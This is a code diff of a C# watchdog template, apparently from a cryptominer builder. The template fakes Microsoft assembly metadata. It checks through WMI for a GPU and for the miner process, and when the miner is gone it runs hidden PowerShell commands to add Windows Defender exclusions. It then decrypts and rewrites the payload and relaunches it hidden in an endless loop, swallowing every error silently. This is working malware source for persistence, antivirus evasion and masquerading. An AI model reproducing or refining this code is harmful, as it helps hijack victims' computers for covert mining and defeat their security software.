@@ -18,32 +18,37 @@ using System.Windows.Forms;
 [assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
 [assembly: AssemblyFileVersion("10.0.19041.746")]
 
-public partial class _rProgram_
+public partial class _rWatchdog_
 {
-    public static byte[] _rxm_ = { };
-    public static int _rcheckcount_ = 0;
-    public static string _rplp_ = PayloadPath;
+    private static byte[] _rxm_;
+    private static int _rcheckcount_ = 0;
+    private static string _rplp_ = PayloadPath;
 
-    public static void Main()
+    private static void Main()
     {
         try
         {
-            _rxm_ = _rAESMethod_(File.ReadAllBytes(_rplp_), true);
             _rWDLoop_();
         }
+#if !DefDebug
+        catch { }
+#else
         catch (Exception ex)
         {
-#if DefDebug
-            MessageBox.Show("W1: " + Environment.NewLine + ex.ToString());
-#endif
-            Environment.Exit(0);
+            MessageBox.Show("WSE: " + Environment.NewLine + ex.ToString());
         }
+#endif
     }
 
-    public static void _rWDLoop_()
+    private static void _rWDLoop_()
     {
         try
         {
+            if (_rxm_ == null)
+            {
+                _rxm_ = _rAESMethod_(File.ReadAllBytes(_rplp_), true);
+            }
+
             string _rarg1_ = "";
             var _rarg4_ = new ConnectionOptions();
             _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
@@ -51,20 +56,20 @@ public partial class _rProgram_
             _rarg5_.Connect();
 
             var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#GPUQUERY")).Get();
-            foreach (ManagementObject MemObj in rarg6)
+            foreach (ManagementObject _rMemObj_ in rarg6)
             {
-                _rarg1_ += (" " + MemObj["#STRVIDEOP"] + " " + MemObj["#STRNAME"]);
+                _rarg1_ += (" " + _rMemObj_["#STRVIDEOP"] + " " + _rMemObj_["#STRNAME"]);
             }
 
             bool _rarg2_ = _rarg1_.IndexOf("#STRNVIDIA", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg1_.IndexOf("#STRAMD", StringComparison.OrdinalIgnoreCase) >= 0;
 
             string _rminers_ = "";
             var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#MINERQUERY")).Get();
-            foreach (ManagementObject retObject in _rarg7_)
+            foreach (ManagementObject _rMemObj_ in _rarg7_)
             {
-                if (retObject != null && retObject["#STRCMDLINE"] != null && retObject["#STRCMDLINE"].ToString().Contains("#MINERID"))
+                if (_rMemObj_ != null && _rMemObj_["#STRCMDLINE"] != null && _rMemObj_["#STRCMDLINE"].ToString().Contains("#MINERID"))
                 {
-                    _rminers_ += retObject["#STRCMDLINE"].ToString();
+                    _rminers_ += _rMemObj_["#STRCMDLINE"].ToString();
                 }
             }
 
@@ -79,64 +84,70 @@ public partial class _rProgram_
                 }
             }
 
-            bool _rexists_ = File.Exists(_rplp_);
-            if (!_rexists_ || _rmissing_)
+            if (_rmissing_)
             {
-                if (!_rexists_ || _rcheckcount_ > 2)
+                _rcheckcount_ += 1;
+            }
+
+            bool _rexists_ = File.Exists(_rplp_);
+            if (!_rexists_ || (_rmissing_ && _rcheckcount_ > 2))
+            {
+                _rcheckcount_ = 0;
+                try
                 {
-                    _rcheckcount_ = 0;
-#if DefWDExclusions
-                    try
-                    {
-                        _rCommand_("#SPOWERSHELL", "#WDCOMMANDS");
-                    }
-                    catch (Exception ex)
-                    {
-#if DefDebug
-                    MessageBox.Show("W2.5: " + Environment.NewLine + ex.ToString());
-#endif
-                    }
-#endif
-                    string _rpath_ = _rplp_;
-                    if (!_rexists_)
-                    {
-                        _rpath_ = Path.Combine(Path.GetTempPath(), "#STRRNDPATH");
-                        Directory.CreateDirectory(Path.GetDirectoryName(_rpath_));
-                        File.WriteAllBytes(_rpath_, _rAESMethod_(_rxm_));
-                    }
                     Process.Start(new ProcessStartInfo
                     {
-                        FileName = _rpath_,
-                        WorkingDirectory = Path.GetDirectoryName(_rpath_),
+                        FileName = "#SPOWERSHELL",
+                        Arguments = "#WDCOMMANDS",
+                        WorkingDirectory = Environment.SystemDirectory,
                         WindowStyle = ProcessWindowStyle.Hidden,
                         CreateNoWindow = true
-                    });
+                    }).WaitForExit();
                 }
-                else
+#if !DefDebug
+                catch { }
+#else
+                catch (Exception ex)
                 {
-                    _rcheckcount_ += 1;
+                    MessageBox.Show("WDE: " + Environment.NewLine + ex.ToString());
                 }
+#endif
+
+                if (!_rexists_)
+                {
+                    Directory.CreateDirectory(Path.GetDirectoryName(_rplp_));
+                    File.WriteAllBytes(_rplp_, _rAESMethod_(_rxm_));
+                }
+                Process.Start(new ProcessStartInfo
+                {
+                    FileName = _rplp_,
+                    WorkingDirectory = Path.GetDirectoryName(_rplp_),
+                    WindowStyle = ProcessWindowStyle.Hidden,
+                    CreateNoWindow = true
+                });
 
             }
         }
+#if !DefDebug
+        catch { }
+#else
         catch (Exception ex)
         {
-#if DefDebug
-            MessageBox.Show("W2: " + Environment.NewLine + ex.ToString());
-#endif
+            MessageBox.Show("WLE: " + Environment.NewLine + ex.ToString());
         }
-        Thread.Sleep(startDelay * 1000 + 20000);
+#endif
+        Thread.Sleep(startDelay * 1000 + 10000);
         _rWDLoop_();
     }
 
 #if DefObfuscate
-    public static string _rGetString_(string _rarg1_)
+    private static string _rGetString_(string _rarg1_)
     {
         return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
     }
 #endif
 
-    public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
+    private static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
     {
 #if DefObfuscate
         var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
@@ -155,26 +166,5 @@ public partial class _rProgram_
 #else
         return _rinput_;
 #endif
-    }
-
-    public static void _rCommand_(string _rarg1_, string _rarg2_)
-    {
-        try
-        {
-            Process.Start(new ProcessStartInfo
-            {
-                FileName = _rarg1_,
-                Arguments = _rarg2_,
-                WorkingDirectory = Environment.SystemDirectory,
-                WindowStyle = ProcessWindowStyle.Hidden,
-                CreateNoWindow = true
-            }).WaitForExit();
-        }
-        catch (Exception ex)
-        {
-#if DefDebug
-                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
-#endif
-        }
     }
 }
